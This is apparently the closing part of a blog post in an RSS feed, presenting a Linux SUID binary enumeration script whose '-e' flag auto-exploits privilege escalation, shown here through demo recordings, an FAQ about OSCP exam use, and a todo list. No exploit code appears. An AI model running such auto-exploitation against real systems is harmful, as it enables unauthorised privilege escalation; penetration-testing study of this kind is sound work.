&lt;h4 id=&#34;suid-enumeration-without--e&#34;&gt;SUID Enumeration (without -e)&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://asciinema.org/a/273928&#34;&gt;&lt;img src=&#34;https://asciinema.org/a/273928.svg&#34; alt=&#34;asciicast&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;auto-exploitation-of-suid-binaries-with--e&#34;&gt;Auto-Exploitation of SUID Binaries (with -e)&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://asciinema.org/a/273929&#34;&gt;&lt;img src=&#34;https://asciinema.org/a/273929.svg&#34; alt=&#34;asciicast&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;faq&#34;&gt;FAQ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Can I run it on OSCP labs/exam machines?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;According to some folks, as long as you aren&amp;rsquo;t using &lt;code&gt;-e&lt;/code&gt; flag, its completely fine! Also, I myself used it in mine, so no probs!&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;you-like-it-now-dont-you---Ê–-&#34;&gt;You like it now, don&amp;rsquo;t you? ( Í¡Â° ÍœÊ– Í¡Â°)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/troll_gifs/hello_pepe.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;future-todos&#34;&gt;Future ToDo(s):&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Get a Life Â¯\&lt;em&gt;(ãƒ„)&lt;/em&gt;/Â¯&lt;/li&gt;
&lt;li&gt;Make improvements in default SUID binaries list&lt;/li&gt;
&lt;li&gt;Create scripts for &lt;code&gt;linux capabilities&lt;/code&gt; and for binaries one can run with &lt;code&gt;sudo&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;aightimmaheadout&#34;&gt;./aightImmaHeadOut&lt;/h3&gt;
&lt;p&gt;Hope, you like the script, you can find me &lt;a href=&#34;https://twitter.com/syed__umar&#34;&gt;@syed__umar&lt;/a&gt; on twitter!&lt;/p&gt;
&lt;p&gt;See ya, later!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/troll_gifs/dissapear.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;script id=&#34;asciicast-343572&#34; src=&#34;https://asciinema.org/a/343572.js&#34; async&gt;&lt;/script&gt;
        
        </description>
    </item>
    
  </channel>
</rss>